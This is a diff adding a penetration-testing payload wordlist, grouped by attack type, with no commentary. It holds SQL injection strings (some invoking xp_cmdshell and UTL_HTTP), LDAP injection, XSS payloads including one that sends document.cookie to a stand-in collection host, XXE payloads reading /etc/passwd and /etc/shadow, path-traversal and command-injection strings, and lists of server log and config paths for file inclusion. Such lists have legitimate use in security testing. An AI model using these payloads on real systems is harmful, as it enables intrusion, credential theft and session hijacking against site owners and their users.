@@ -1,0 +1,422 @@
+SQL
+'
+"
+#
+-
+--
+' --
+--';
+' ;
+= '
+= ;
+= --
+\x23
+\x27
+\x3D \x3B'
+\x3D \x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or select *
+admin'--
+';shutdown--
+<>"'%;)(&+
+' or ''='
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+
+-------------------------------
+
+XSS
+"><script>"
+<script>alert("XSS")</script>
+<<script>alert("XSS");//<</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+\";alert('XSS');//
+%3cscript%3ealert("XSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtale rt
+<xss><script>alert('XSS')</script></vulnerable>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83) )>
+<IMG%20SRC='javasc ript:alert(document.cookie)'>
+<IMG SRC="jav ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="  javascript:alert('XSS');">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%2 3x6c;ert(document.%26%23x63;ookie)'>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70& #x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58& #x53&#x53&#x27&#x29>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3 E%3C/IFRAME%3E
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A %2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi %3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+'';!--"<XSS>=&{()}
+
+--------------------------------
+
+XML
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+
+------------------------------------------
+
+Traversal
+../../../../../../../../../../../../etc/hosts%00
+../../../../../../../../../../../../etc/hosts
+../../boot.ini
+/../../../../../../../../%2A
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/shadow^^
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/shadow
+/./././././././././././etc/passwd
+/./././././././././././etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/shadow
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%00/etc/passwd%00
+%00/etc/shadow%00
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+/../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../../etc/passwd%00.html
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2 5%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25% 5c..%25%5c..%00
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2 5%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25% 5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2 5%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..% 25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2 5%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..% 25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2 5%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25% 5c..%25%5c..winnt/desktop.ini
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+../../../../../../../../conf/server.xml
+/../../../../../../../../bin/id|
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+C:/boot.ini
+C:\boot.ini
+../../../../../../../../../../../../localstart.asp%00
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini%00
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/.../.../.../.../.../
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+
+
+-------------------------------------
+/etc/passwd 
+
+/etc/shadow 
+/etc/group 
+/etc/security/group  
+/etc/security/passwd 
+/etc/security/user 
+/etc/security/environ  
+/etc/security/limits 
+/usr/lib/security/mkuser.default  
+../apache/logs/access.log 
+../../apache/logs/error.log  
+../../apache/logs/access.log 
+../../../apache/logs/error.log  
+../../../apache/logs/access.log  
+../../../../../../../etc/httpd/logs/acces_log  
+../../../../../../../etc/httpd/logs/acces.log  
+../../../../../../../etc/httpd/logs/error_log  
+../../../../../../../etc/httpd/logs/error.log  
+../../../../../../../var/www/logs/access_log  
+../../../../../../../var/www/logs/access.log  
+../../../../../../../usr/local/apache/logs/access_ log  
+../../../../../../../usr/local/apache/logs/access. log  
+../../../../../../../var/log/apache/access_log  
+../../../../../../../var/log/apache2/access_log  
+../../../../../../../var/log/apache/access.log  
+../../../../../../../var/log/apache2/access.log  
+../../../../../../../var/log/access_log  
+../../../../../../../var/log/access.log  
+../../../../../../../var/www/logs/error_log  
+../../../../../../../var/www/logs/error.log  
+../../../../../../../usr/local/apache/logs/error_l og  
+../../../../../../../usr/local/apache/logs/error.l og  
+../../../../../../../var/log/apache/error_log  
+../../../../../../../var/log/apache2/error_log  
+../../../../../../../var/log/apache/error.log  
+../../../../../../../var/lz 
+../../../../../../../../../home\bin\stable\apache\php.ini  
+../../../../../../../../../Volumes/Macintosh_HD1/usr/local/php/lib/php.ini
+
+
+--------------------------------------
+
+*log 
+
+/usr/local/cpanel/logs 
+/usr/local/cpanel/logs/stats_log  
+/usr/local/cpanel/logs/access_log 
+/usr/local/cpanel/logs/error_log  
+/usr/local/cpanel/logs/license_log 
+/usr/local/cpanel/logs/login_log  
+/usr/local/cpanel/logs/stats_log 
+*conf 
+/var/cpanel/cpanel.config
+
+--------------------------------------
+
+MySQL(Windows): 
+log + conf 
+
+C:\Program Files\MySQL\MySQL Server 5.0\data\hostname.err 
+C:\Program  Files\MySQL\MySQL Server 5.0\data\mysql.log 
+C:\Program Files\MySQL\MySQL  Server 5.0\data\mysql.err 
+C:\Program Files\MySQL\MySQL Server  5.0\data\mysql-bin.log 
+C:\Program Files\MySQL\data\hostname.err  
+C:\Program Files\MySQL\data\mysql.log 
+C:\Program  Files\MySQL\data\mysql.err 
+C:\Program Files\MySQL\data\mysql-bin.log  
+C:\MySQL\data\hostname.err 
+C:\MySQL\data\mysql.log  
+C:\MySQL\data\mysql.err 
+C:\MySQL\data\mysql-bin.log  
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini 
+C:\Program  Files\MySQL\MySQL Server 5.0\my.cnf 
+C:\Program Files\MySQL\my.ini  
+C:\Program Files\MySQL\my.cnf 
+C:\MySQL\my.ini 
+C:\MySQL\my.cnf
+
+--------------------------------
+
+FTP 
+
+ProFTPD: 
+*log 
+/etc/logrotate.d/proftpd 
+/www/logs/proftpd.system.log  
+/var/log/proftpd 
+*conf 
+/etc/proftp.conf 
+/etc/protpd/proftpd.conf  
+/etc/vhcs2/proftpd/proftpd.conf 
+/etc/proftpd/modules.conf  
+
+vsftpd: 
+*log 
+/var/log/vsftpd.log 
+/etc/vsftpd.chroot_list  
+/etc/logrotate.d/vsftpd.log 
+*conf 
+/etc/vsftpd/vsftpd.conf  
+/etc/vsftpd.conf 
+/etc/chrootUsers 
+
+wu-ftpd: 
+*log  
+/var/log/xferlog 
+/var/adm/log/xferlog 
+*conf  
+/etc/wu-ftpd/ftpaccess 
+/etc/wu-ftpd/ftphosts 
+/etc/wu-ftpd/ftpusers  
+
+Pure-FTPd: 
+*conf 
+/usr/sbin/pure-config.pl  
+/usr/etc/pure-ftpd.conf 
+/etc/pure-ftpd/pure-ftpd.conf  
+/usr/local/etc/pure-ftpd.conf 
+/usr/local/etc/pureftpd.pdb  
+/usr/local/pureftpd/etc/pureftpd.pdb  
+/usr/local/pureftpd/sbin/pure-config.pl  
+/usr/local/pureftpd/etc/pure-ftpd.conf 
+-/etc/pure-ftpd.conf  
+/etc/pure-ftpd/pure-ftpd.pdb 
+/etc/pureftpd.pdb 
+/etc/pureftpd.passwd  
+/etc/pure-ftpd/pureftpd.pdb 
+DragonflyBSD & FreeBSD:  /usr/ports/ftp/pure-ftpd/ 
+OpenBSD: /usr/ports/net/pure-ftpd/ 
+NetBSD:  /usr/pkgsrc/net/pureftpd/ 
+Crux Linux: /usr/ports/contrib/pure-ftpd/ 
+*log  
+/var/log/pure-ftpd/pure-ftpd.log 
+/logs/pure-ftpd.log  
+/var/log/pureftpd.log 
+
+Other: 
+/var/log/ftp-proxy/ftp-proxy.log  
+/var/log/ftp-proxy 
+/var/log/ftplog 
+/etc/logrotate.d/ftp  
+/etc/ftpchroot 
+/etc/ftphosts
+
+---------------------------
+
+Mail Server 
+
+/var/log/exim_mainlog 
+/var/log/exim/mainlog 
+/var/log/maillog  
+/var/log/exim_paniclog 
+/var/log/exim/paniclog  
+/var/log/exim/rejectlog 
+/var/log/exim_rejectlog
+
+------------------------------
